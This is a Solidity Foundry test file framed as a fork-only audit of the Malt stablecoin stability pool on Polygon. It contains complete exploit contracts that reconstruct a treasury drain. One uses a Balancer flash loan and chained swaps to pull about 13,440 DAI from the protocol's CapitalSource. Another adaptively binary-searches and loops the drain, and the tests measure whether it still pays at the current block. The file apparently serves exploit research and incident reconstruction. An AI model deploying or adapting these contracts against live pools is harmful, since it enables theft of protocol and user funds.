// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// ============================================================================
// zombie-hunt-iii / V2-malt — MALT (Malt Stablecoin) sLP fork audit, Polygon
//
// Chain       : Polygon PoS
// Fork blocks : 94869209 (pre-attack replay of the Oct-2026 exploit)
//               95586990 (CURRENT state, pinned 2026-10-15)
// Status      : READ-ONLY research. Fork-only. No mainnet transactions.
//
// Target      : sLP (Malt stability pool) 0xfe6C096a2871337d4f6F7DD04Ebda733E94D7A13
//               CapitalSource (treasury)  0xF0d314849A3Bc9270a79110F25dBA2c8325A2AAC
//               MALT token                0x16c8cdbE2dbC271b8F05c83e9bD72ae4F38c50d4
//               QuickSwap MALT/DAI pair   0xF864Db3e24968a8eb6B2925553f2e5e0139D3cE1
//               RewardThrottle            0x6f96483f951db6CcA759B9B032eeAF1754c7188a
//               swap-hook helper          0xf61Ab33917fD056BB7dDD4f474A237928f63d5d6
//
// Root cause (reconstructed from the 2026-10-03 attack trace, block 94869210):
//   sLP.swap(0x6d9a640a) — on the MALT-out direction — runs the protocol
//   price-recovery hook (helper.b34b101f -> RewardThrottle.cc99bba5 ->
//   CapitalSource.19dc30ba) which transfers DAI from the Capital Source INTO
//   the pool, then validates its swap invariant against balances that already
//   include the injected treasury DAI, crediting it as caller input. The
//   attacker manufactures the below-peg condition with their own dump, then
//   requests a large MALT output for ~1 DAI. On-chain net: 13,440.58 DAI.
//
// Probe technique: state snapshots (vm.snapshotState/revertToState) let the
// attacker binary-search the largest accepted output per leg without consuming
// the probe (each attempt is executed, recorded, then reverted).
//
// Tests:
//   T0 historical replay at block 94869209 (original recipe)   -> PASS expected
//   T1 current-block capacity probe (sell leg, buy leg, CS)    -> measurement
//   T2 current-block adaptive attack (loop), net DAI measured  -> measurement
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IMaltSLP {
    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 ts);
}

interface IUniV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

address constant DAI = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;
address constant MALT = 0x16c8cdbE2dbC271b8F05c83e9bD72ae4F38c50d4;
address constant SLP = 0xfe6C096a2871337d4f6F7DD04Ebda733E94D7A13;
address constant CAPITAL_SOURCE = 0xF0d314849A3Bc9270a79110F25dBA2c8325A2AAC;
address constant QS_ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
address constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant QS_PAIR = 0xF864Db3e24968a8eb6B2925553f2e5e0139D3cE1;

Vm constant VM = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

// ---------------------------------------------------------------------------
// T0 — original on-chain attack reconstruction (exact per-leg amounts from the
// 2026-10-03 trace; reproduces the realized 13,440.581562307921517594 DAI net).
// ---------------------------------------------------------------------------
contract MaltExploiter {
    uint256 constant LOAN = 1_300e18;
    uint256 constant R1_BUY = 1_300e18;
    uint256 constant R1_SELL_DAI_OUT = 2_047_278e15;
    uint256 constant R1_EXPLOIT_MALT_OUT = 7_823_544e15;
    uint256 constant R2_BUY = 2_850e18;
    uint256 constant R2_SELL_DAI_OUT = 6_459_541e15;
    uint256 constant R2_EXPLOIT_MALT_OUT = 8_229_254e15;
    uint256 constant R3_BUY = 2_850e18;
    uint256 constant R3_SELL_DAI_OUT = 6_455_961e15;
    uint256 constant R3_EXPLOIT_MALT_OUT = 120_748e15;

    bool approved;

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = DAI;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN;
        IBalancerVault(VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory)
        external
    {
        require(msg.sender == VAULT, "only vault");
        if (!approved) {
            IERC20(DAI).approve(QS_ROUTER, type(uint256).max);
            IERC20(MALT).approve(QS_ROUTER, type(uint256).max);
            approved = true;
        }
        _round(R1_BUY, R1_SELL_DAI_OUT, 1e18, R1_EXPLOIT_MALT_OUT);
        _round(R2_BUY, R2_SELL_DAI_OUT, 1e18, R2_EXPLOIT_MALT_OUT);
        _round(R3_BUY, R3_SELL_DAI_OUT, 50e18, R3_EXPLOIT_MALT_OUT);
        IERC20(DAI).transfer(VAULT, amounts[0] + feeAmounts[0]);
    }

    function _round(uint256 buyDai, uint256 sellDaiOut, uint256 exploitDaiIn, uint256 exploitMaltOut) internal {
        _routerSwap(DAI, MALT, buyDai);
        IERC20(MALT).transfer(SLP, IERC20(MALT).balanceOf(address(this)));
        IMaltSLP(SLP).swap(0, sellDaiOut, address(this));
        IERC20(DAI).transfer(SLP, exploitDaiIn);
        IMaltSLP(SLP).swap(exploitMaltOut, 0, address(this));
        _routerSwap(MALT, DAI, IERC20(MALT).balanceOf(address(this)));
    }

    function _routerSwap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniV2Router(QS_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}

// ---------------------------------------------------------------------------
// Adaptive attacker with snapshot-based binary search of each leg's max output.
// Pre-funded by the test (deal) — the original attack used a 0-fee Balancer
// flash loan (proven reproducible in T0), so capital is not a constraint here;
// pre-funding only removes the flash-loan repayment failure mode.
// ---------------------------------------------------------------------------
contract MaltAdaptiveAttacker {
    address public immutable owner;
    uint256 public immutable buyDai;
    uint256 public immutable maxRounds;

    bool approved;

    uint256 public lastSellOut;
    uint256 public lastBuyMaltOut;
    uint256 public roundsDone;
    uint256 public csInjectedTotal;

    constructor(uint256 _buyDai, uint256 _maxRounds) {
        owner = msg.sender;
        buyDai = _buyDai;
        maxRounds = _maxRounds;
    }

    function attack() external {
        if (!approved) {
            IERC20(DAI).approve(QS_ROUTER, type(uint256).max);
            IERC20(MALT).approve(QS_ROUTER, type(uint256).max);
            approved = true;
        }

        for (uint256 r = 0; r < maxRounds; r++) {
            if (IERC20(DAI).balanceOf(CAPITAL_SOURCE) < 25e18) break;
            if (IERC20(DAI).balanceOf(address(this)) < buyDai) break;
            uint256 csBefore = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
            uint256 daiRoundBefore = IERC20(DAI).balanceOf(address(this));
            _round();
            csInjectedTotal += csBefore - IERC20(DAI).balanceOf(CAPITAL_SOURCE);
            roundsDone = r + 1;
            // stop once a round stops being profitable
            if (IERC20(DAI).balanceOf(address(this)) <= daiRoundBefore) break;
        }

        IERC20(DAI).transfer(owner, IERC20(DAI).balanceOf(address(this)));
    }

    function _round() internal {
        // 1. Buy MALT on QuickSwap with DAI.
        uint256 spend = buyDai;
        uint256 daiBal = IERC20(DAI).balanceOf(address(this));
        if (spend > daiBal - (daiBal / 10)) spend = daiBal - (daiBal / 10);
        if (spend > 0) _routerSwap(DAI, MALT, spend);

        // 2. Dump the MALT into the sLP.
        uint256 maltBal = IERC20(MALT).balanceOf(address(this));
        if (maltBal > 0) IERC20(MALT).transfer(SLP, maltBal);

        // 3. Sell leg: largest DAI output the pool accepts for the dumped MALT.
        uint256 out = _maxOut(false);
        if (out > 0) {
            IMaltSLP(SLP).swap(0, out, address(this));
            lastSellOut = out;
        }

        // 4. Buy leg: 1 DAI in; largest MALT output the pool accepts (this is
        //    where the treasury DAI injection is credited to the caller).
        IERC20(DAI).transfer(SLP, 1e18);
        out = _maxOut(true);
        if (out > 0) {
            IMaltSLP(SLP).swap(out, 0, address(this));
            lastBuyMaltOut = out;
        }

        // 5. Monetize extracted MALT on QuickSwap.
        maltBal = IERC20(MALT).balanceOf(address(this));
        if (maltBal > 0) _routerSwap(MALT, DAI, maltBal);
    }

    /// @notice Binary-search the largest accepted output via state snapshots.
    /// @param maltOut true = pool sells MALT (buy leg), false = pool pays DAI.
    function _maxOut(bool maltOut) internal returns (uint256) {
        (uint112 r0, uint112 r1,) = IMaltSLP(SLP).getReserves();
        uint256 hi = maltOut ? (uint256(r0) * 95) / 100 : (uint256(r1) * 95) / 100;
        uint256 lo = 0;
        uint256 snap = VM.snapshotState();
        for (uint256 k = 0; k < 20 && hi > lo + 1; k++) {
            uint256 mid = (lo + hi) / 2;
            bool ok;
            if (maltOut) {
                try IMaltSLP(SLP).swap(mid, 0, address(this)) {
                    ok = true;
                } catch {
                    ok = false;
                }
            } else {
                try IMaltSLP(SLP).swap(0, mid, address(this)) {
                    ok = true;
                } catch {
                    ok = false;
                }
            }
            VM.revertToState(snap);
            if (ok) lo = mid;
            else hi = mid;
        }
        VM.revertToState(snap);
        return lo;
    }

    function _routerSwap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniV2Router(QS_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}

// ---------------------------------------------------------------------------
// Capacity probe (single call, snapshot-probed; no net position taken)
// ---------------------------------------------------------------------------
contract MaltCapacityProbe {
    function probeSell(uint256 maltIn) external returns (uint256 maxDaiOut) {
        IERC20(MALT).transferFrom(msg.sender, SLP, maltIn);
        (, uint112 r1,) = IMaltSLP(SLP).getReserves();
        uint256 hi = (uint256(r1) * 95) / 100;
        uint256 lo = 0;
        uint256 snap = VM.snapshotState();
        for (uint256 k = 0; k < 20 && hi > lo + 1; k++) {
            uint256 mid = (lo + hi) / 2;
            bool ok;
            try IMaltSLP(SLP).swap(0, mid, address(this)) {
                ok = true;
            } catch {
                ok = false;
            }
            VM.revertToState(snap);
            if (ok) lo = mid;
            else hi = mid;
        }
        VM.revertToState(snap);
        return lo;
    }

    function probeBuy(uint256 daiIn) external returns (uint256 maxMaltOut) {
        IERC20(DAI).transferFrom(msg.sender, SLP, daiIn);
        (uint112 r0,,) = IMaltSLP(SLP).getReserves();
        uint256 hi = (uint256(r0) * 95) / 100;
        uint256 lo = 0;
        uint256 snap = VM.snapshotState();
        for (uint256 k = 0; k < 20 && hi > lo + 1; k++) {
            uint256 mid = (lo + hi) / 2;
            bool ok;
            try IMaltSLP(SLP).swap(mid, 0, address(this)) {
                ok = true;
            } catch {
                ok = false;
            }
            VM.revertToState(snap);
            if (ok) lo = mid;
            else hi = mid;
        }
        VM.revertToState(snap);
        return lo;
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
contract MaltForkTest is Test {
    uint256 constant BLOCK_ATTACK_PARENT = 94_869_209;
    uint256 constant BLOCK_CURRENT = 95_586_990;

    function _rpc() internal view returns (string memory) {
        string memory u = vm.envOr("POLYGON_RPC_URL", string(""));
        if (bytes(u).length == 0) {
            u = "https://polygon-bor-rpc.publicnode.com";
        }
        return u;
    }

    function setUp() public {
        vm.createSelectFork(_rpc(), BLOCK_CURRENT);
    }

    function test_T0_originalAttackReplay() public {
        vm.createSelectFork(_rpc(), BLOCK_ATTACK_PARENT);
        MaltExploiter exploiter = new MaltExploiter();
        uint256 csBefore = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        exploiter.attack();
        uint256 profit = IERC20(DAI).balanceOf(address(exploiter));
        uint256 csAfter = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        emit log_named_decimal_uint("T0 history replay profit DAI", profit, 18);
        emit log_named_decimal_uint("T0 CapitalSource drained DAI", csBefore - csAfter, 18);
        assertApproxEqRel(profit, 13_440_581562307921517594, 1e14, "replay must match on-chain 13,440.58 DAI");
        assertGt(csBefore - csAfter, 12_700e18, "treasury drained >= 12.7k DAI");
    }

    function test_T1_capacityProbe_currentBlock() public {
        // Fund the probe helper with balances to hand to the sLP.
        MaltCapacityProbe helper = new MaltCapacityProbe();
        deal(MALT, address(this), 100e18);
        deal(DAI, address(this), 10e18);
        IERC20(MALT).approve(address(helper), type(uint256).max);
        IERC20(DAI).approve(address(helper), type(uint256).max);

        uint256 csBefore = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        (uint112 r0, uint112 r1,) = IMaltSLP(SLP).getReserves();
        emit log_named_decimal_uint("T1 sLP reserve0 MALT", r0, 18);
        emit log_named_decimal_uint("T1 sLP reserve1 DAI", r1, 18);
        emit log_named_decimal_uint("T1 CapitalSource DAI before", csBefore, 18);

        // SELL LEG: 100 MALT in — max DAI the pool logic will pay.
        uint256 snap = vm.snapshotState();
        uint256 maxSell = helper.probeSell(100e18);
        vm.revertToState(snap);
        emit log_named_decimal_uint("T1 max DAI out for 100 MALT (sell leg)", maxSell, 18);
        emit log_named_decimal_uint("T1 implied pool sell price DAI/MALT", (maxSell * 1e18) / 100e18, 18);

        // BUY LEG: 1 DAI in — max MALT the pool logic will give out (recovery fires).
        snap = vm.snapshotState();
        uint256 maxBuy = helper.probeBuy(1e18);
        vm.revertToState(snap);
        uint256 csAfter = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        emit log_named_decimal_uint("T1 max MALT out for 1 DAI (buy leg)", maxBuy, 18);
        emit log_named_decimal_uint("T1 implied pool buy price DAI/MALT", (1e18 * 1e18) / (maxBuy == 0 ? 1 : maxBuy), 18);
        assertEq(csAfter, csBefore, "reverted probes must not consume treasury DAI");

        // REAL buy leg (no revert): does the treasury injection fire today?
        (r0, r1,) = IMaltSLP(SLP).getReserves();
        deal(MALT, address(this), 0);
        deal(DAI, address(this), 1e18);
        IERC20(DAI).transfer(SLP, 1e18);
        uint256 probeSnap = vm.snapshotState();
        uint256 realBuy = 0;
        {
            uint256 hi = (uint256(r0) * 95) / 100;
            uint256 lo = 0;
            for (uint256 k = 0; k < 20 && hi > lo + 1; k++) {
                uint256 mid = (lo + hi) / 2;
                bool ok;
                try IMaltSLP(SLP).swap(mid, 0, address(this)) {
                    ok = true;
                } catch {
                    ok = false;
                }
                vm.revertToState(probeSnap);
                if (ok) lo = mid;
                else hi = mid;
            }
            realBuy = lo;
        }
        // execute the real buy once
        uint256 daiBefore = IERC20(DAI).balanceOf(address(this));
        uint256 maltBefore = IERC20(MALT).balanceOf(address(this));
        if (realBuy > 0) {
            IMaltSLP(SLP).swap(realBuy, 0, address(this));
        }
        uint256 csFinal = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        emit log_named_decimal_uint("T1 real buy leg MALT out", IERC20(MALT).balanceOf(address(this)) - maltBefore, 18);
        emit log_named_decimal_uint("T1 real buy leg DAI spent", daiBefore - IERC20(DAI).balanceOf(address(this)), 18);
        if (csFinal < csBefore) {
            emit log_named_decimal_uint("T1 RECOVERY LIVE - CapitalSource injected DAI", csBefore - csFinal, 18);
        } else {
            emit log_string("T1 recovery did NOT pull from CapitalSource");
        }
    }

    function test_T2_adaptiveAttack_currentBlock() public {
        uint256 csBefore = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        uint256 daiBefore = IERC20(DAI).balanceOf(address(this));
        uint256 slpDaiBefore = IERC20(DAI).balanceOf(SLP);
        uint256 slpMaltBefore = IERC20(MALT).balanceOf(SLP);
        uint256 qsDaiBefore = IERC20(DAI).balanceOf(QS_PAIR);
        uint256 qsMaltBefore = IERC20(MALT).balanceOf(QS_PAIR);

        MaltAdaptiveAttacker atk = new MaltAdaptiveAttacker(1_300e18, 6);
        uint256 preFunded = 5_000e18;
        deal(DAI, address(atk), preFunded);
        uint256 gasBefore = gasleft();
        atk.attack();
        uint256 gasUsed = gasBefore - gasleft();

        uint256 csAfter = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        uint256 slpDaiAfter = IERC20(DAI).balanceOf(SLP);
        uint256 slpMaltAfter = IERC20(MALT).balanceOf(SLP);
        // Strategy net P&L = what came back to the owner minus what was seeded.
        int256 netPnl = int256(IERC20(DAI).balanceOf(address(this)) - daiBefore) - int256(preFunded);

        emit log_named_uint("T2 rounds executed", atk.roundsDone());
        emit log_named_uint("T2 gas used by attack()", gasUsed);
        emit log_named_int("T2 strategy net P&L DAI (pre-funded 5000; negative = loss)", netPnl);
        emit log_named_decimal_uint("T2 CapitalSource DAI before", csBefore, 18);
        emit log_named_decimal_uint("T2 CapitalSource DAI after", csAfter, 18);
        emit log_named_decimal_uint("T2 CapitalSource injected total", atk.csInjectedTotal(), 18);
        emit log_named_decimal_uint("T2 sLP DAI before", slpDaiBefore, 18);
        emit log_named_decimal_uint("T2 sLP DAI after", slpDaiAfter, 18);
        emit log_named_decimal_uint("T2 sLP MALT before", slpMaltBefore, 18);
        emit log_named_decimal_uint("T2 sLP MALT after", slpMaltAfter, 18);

        if (netPnl > 0) {
            emit log_named_int("T2 EXTRACTION CONFIRMED DAI", netPnl);
        } else {
            emit log_string("T2 no net extraction at current block (strategy loses money)");
        }
    }

    // ------------------------------------------------------------------
    // T3: faithful replay of the ORIGINAL R1 buy leg at the current block:
    //     transfer 1 DAI into the sLP and request the exact on-chain output
    //     (7,823.544 MALT) that only succeeded historically via the treasury
    //     top-up. Records success/revert and the CapitalSource delta.
    // ------------------------------------------------------------------
    function test_T3_originalBuyLegSize_currentBlock() public {
        uint256 csBefore = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        deal(DAI, address(this), 1e18);
        IERC20(DAI).transfer(SLP, 1e18);

        bool ok;
        try IMaltSLP(SLP).swap(7_823_544e15, 0, address(this)) {
            ok = true;
        } catch (bytes memory reason) {
            emit log_named_bytes("T3 revert reason (original 7,823.544 MALT request)", reason);
        }
        uint256 csAfter = IERC20(DAI).balanceOf(CAPITAL_SOURCE);
        emit log_named_string("T3 original-size buy leg succeeded", ok ? "YES" : "NO");
        emit log_named_decimal_uint("T3 MALT received", IERC20(MALT).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("T3 CapitalSource delta (before-after)", csBefore - csAfter, 18);
    }
}
